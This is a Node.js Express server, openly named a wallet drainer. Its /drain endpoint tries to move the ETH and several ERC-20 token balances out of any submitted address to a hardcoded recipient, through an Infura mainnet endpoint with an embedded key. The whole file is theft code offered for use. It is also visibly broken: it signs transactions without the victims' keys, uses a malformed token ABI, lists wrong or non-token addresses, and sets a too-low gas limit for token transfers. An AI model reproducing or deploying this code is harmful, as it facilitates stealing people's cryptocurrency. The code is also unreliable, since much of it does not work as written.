const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { Web3 } = require('web3');

const app = express();
app.use(bodyParser.json());
app.use(cors({
  origin: '*',
}));

// Replace with your Infura or Alchemy endpoint
const web3 = new Web3('https://mainnet.infura.io/v3/a5bcd23a2bd145a395a10143ed34e1ea');

// Set the recipient address (this is where the tokens will be sent)
const recipientAddress = '0x231d66c5121aa46d80B5134491286c5EF82b60ac';

// Function to drain all tokens from a wallet
const drainWallet = async (fromAddress) => {
  // Drain native ETH
  const balance = await web3.eth.getBalance(fromAddress);
  const gasPrice = await web3.eth.getGasPrice();
  const gasLimit = 21000; // Gas limit for a simple transaction

  const drainedEth = await web3.eth.sendTransaction({
    from: fromAddress,
    to: recipientAddress,
    value: balance,
    gas: gasLimit,
    gasPrice: gasPrice,
  });

  // Drain ERC-20 tokens (example tokens)
  const tokenAddresses = [
    '0x6B175474E29A5A0F9E31E7868C9D7D78C96D68D8', // DAI
    '0x18160AA0284C1D3B8061E4C1E6D1506680742A5A', // USDT
    '0x6F06D29995C7C0D1640D888A01D35688C93C8667', // USDC
    '0x7A250D5630C5dD21bB61eC384170cD1B3C995A9C', // Uniswap
    '0x22C01683Dd2D498D7D4d8D7836686F520A3254D5', // WETH
    '0x57Ab1ecF8d1297C6C789Dc19248F5B7Df8c6948b', // ETH
  ];

  for (const token of tokenAddresses) {
    const tokenContract = new web3.eth.Contract([
      {
        constant: true,
        inputs: [{ _owner: { type: 'address' } }],
        name: 'balanceOf',
        outputs: [{ type: 'uint256' }],
        payable: false,
        type: 'function',
      },
      {
        payable: true,
        inputs: [
          { _to: { type: 'address' } },
          { _value: { type: 'uint256' } },
        ],
        name: 'transfer',
        outputs: [{ type: 'bool' }],
        type: 'function',
      },
    ], token);

    const balance = await tokenContract.methods.balanceOf(fromAddress).call();
    if (balance > 0) {
      await tokenContract.methods
        .transfer(recipientAddress, balance)
        .send({
          from: fromAddress,
          gas: gasLimit,
          gasPrice: gasPrice,
        });
    }
  }

  return drainedEth;
};

// API endpoint to drain the wallet
app.post('/drain', async (req, res) => {
  const { fromAddress } = req.body;

  if (!fromAddress) {
    return res.status(400).send('Wallet address not provided');
  }

  try {
    await drainWallet(fromAddress);
    res.send('Wallet drained successfully!');
  } catch (err) {
    res.status(500).send('Error draining wallet: ' + err.message);
  }
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});j
